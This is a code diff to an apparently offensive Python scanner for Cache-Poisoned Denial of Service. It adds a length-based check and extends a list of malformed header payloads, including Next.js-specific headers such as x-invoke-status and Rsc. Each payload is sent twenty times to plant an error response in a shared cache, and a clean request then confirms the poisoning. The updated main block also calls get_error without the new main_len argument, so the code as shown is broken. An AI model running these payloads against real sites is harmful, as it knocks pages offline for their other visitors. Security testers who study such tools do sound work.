@@ -8,17 +8,17 @@ https://cpdos.org/
 
 from ..utils import *
 
-def check_cached(url, s, pk, main_status_code, authent):
+def check_cached_status(url, s, pk, main_status_code, authent):
     behavior = False
     confirmed = False
     cache_status = False
 
     try:
         for i in range(0, 20):
-            req = s.get(url, headers=pk, verify=False, auth=authent, timeout=10)
-        req_verify = s.get(url, verify=False, auth=authent, timeout=10)
+            req = s.get(url, headers=pk, verify=False, allow_redirects=False, auth=authent, timeout=10)
+        req_verify = s.get(url, verify=False, allow_redirects=False, auth=authent, timeout=10)
         #print(f"{req.status_code} :: {req_verify.status_code}")
-        if req.status_code == req_verify.status_code and req.status_code not in [429, 200, 304]:
+        if req.status_code == req_verify.status_code and req.status_code not in [429, 200, 304, 303]:
             behavior = True
             for rh in req_verify.headers:
                 if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
@@ -26,7 +26,7 @@ def check_cached(url, s, pk, main_status_code, authent):
                     cache_status = True
         elif req.status_code != req_verify.status_code and req.status_code == 304:
             for rh in req_verify.headers:
-                if "age" in rh.lower():
+                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                     confirmed = True
                     cache_status = True
         elif req.status_code != req_verify.status_code and req.status_code not in [429, 304]:
@@ -38,6 +38,7 @@ def check_cached(url, s, pk, main_status_code, authent):
         if confirmed:
             print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
             behavior = False
+            confirmed = False
         elif behavior:
             print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
     except Exception as e:
@@ -45,7 +46,42 @@ def check_cached(url, s, pk, main_status_code, authent):
         #print(f"Error : {e}")
 
 
-def get_error(url, s, main_status_code, authent):
+def check_cached_len(url, s, pk, main_len, authent):
+    behavior = False
+    confirmed = False
+    cache_status = False
+
+    try:
+        for i in range(0, 20):
+            req = s.get(url, headers=pk, verify=False, allow_redirects=False, auth=authent, timeout=10)
+        req_verify = s.get(url, verify=False, allow_redirects=False, auth=authent, timeout=10)
+        #print(f"{req.status_code} :: {req_verify.status_code}")
+        if len(req.content) == len(req_verify.content):
+            behavior = True
+            for rh in req_verify.headers:
+                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
+                    confirmed = True
+                    cache_status = True
+        elif len(req.content) != len(req_verify.content):
+            for rh in req_verify.headers:
+                if "age" in rh.lower():
+                    behavior = True
+                    cache_status = True
+                else:
+                    behavior = True
+                    cache_status = False
+
+        if confirmed:
+            print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_len}b > {len(req.content)}b | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
+            behavior = False
+        elif behavior:
+            print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_len}b > {len(req.content)}b | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
+    except Exception as e:
+        pass
+        #print(f"Error : {e}")
+
+
+def get_error(url, s, main_status_code, main_len, authent):
 
     payload_keys = [
     {"xyz": "1"},
@@ -59,9 +95,10 @@ def get_error(url, s, main_status_code, authent):
     {"Accept-Encoding": "toto"},
     {"Accept-Encoding": "gzip;q=1.0, identity;q=0.5, *;q=0"},
     {"Expect": "100-continue"},
-    #{"If-None-Match": "*"},
+    {"If-None-Match": "etag123"},
     {"If-None-Match": "*", "If-Match": "toto"},
     {"If-None-Match": "<toto>"},
+    {"If-Match": "etag-value"},
     {"Max-Forwards": "0"},
     {"Max-Forwards": "foo"},
     {"TE": "toto"},
@@ -80,6 +117,8 @@ def get_error(url, s, main_status_code, authent):
     {"Content-Length":"394616521189"},
     {"Content-Length": "-1"},
     {"Transfer-Encoding": "chunked"},
+    {"Transfer-Encoding": "compress"},
+    {"Transfer-Encoding": "gzip, chunked"},
     {"Content-Type": "application/invalid-type"},
     {"Retry-After":"-1"},
     {"Retry-After":"foo"},
@@ -125,14 +164,30 @@ def get_error(url, s, main_status_code, authent):
     {"Cross-Origin-Opener-Policy": "same-origin"},
     {"Cross-Origin-Resource-Policy": "same-origin"},
     {"Server-Timing": "miss, db;dur=53, app;dur=47.2"},
+    {"x-invoke-status": "888"},
+    {"x-invoke-status": "404"},
+    {"x-invoke-status": "xxx"},
+    {"Rsc": "1"},
+    {"Rsc": "xxx"},
+    {"x-middleware-prefetch": "1"},
     ]
     for pk in payload_keys:
         uri = f"{url}{random.randrange(999)}"
         try:
-            req = s.get(uri, headers=pk, verify=False, auth=authent, timeout=10)
-            if req.status_code != 200 and main_status_code not in [403, 401] and req.status_code != main_status_code:
+            req = s.get(uri, headers=pk, verify=False, auth=authent, timeout=10, allow_redirects=False)
+            len_req = len(req.content)
+
+            if req.status_code == 888:
+                print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError 888 response | CACHE: N/A | \033[34m{url}\033[0m | PAYLOAD: {pk}")
+                check_cached_status(uri, s, pk, main_status_code, authent)
+            elif req.status_code != 200 and main_status_code not in [403, 401] and req.status_code != main_status_code:
                 #print(f"[{main_status_code}>{req.status_code}] [{len(main_status_code.headers)}b>{len(req.headers)}b] [{len(main_status_code.content)}b>{len(req.content)}b] {url} :: {pk}")
-                check_cached(uri, s, pk, main_status_code, authent)
+                check_cached_status(uri, s, pk, main_status_code, authent)
+            elif req.status_code == 200:
+                if len(str(main_len)) <= 5 and main_len not in range(len_req - 1000, len_req + 1000):
+                    check_cached_len(uri, s, pk, main_len, authent)
+                elif len(str(main_len)) > 5 and main_len not in range(len_req - 5000, len_req + 5000):
+                    check_cached_len(uri, s, pk, main_len, authent)
         except requests.Timeout:
             #print(f"request timeout {url} {p}")
             pass
@@ -153,7 +208,8 @@ if __name__ == '__main__':
         urls = urls.read().splitlines()
         for url in urls:
             try:
-                req_main = requests.get(url, verify=False, timeout=10)
+                req_main = requests.get(url, verify=False, timeout=10, allow_redirects=False)
+                main_len = len(req_main.content)
                 main_status_code = req_main.status_code
                 authent = False
                 get_error(url, s, main_status_code, authent)
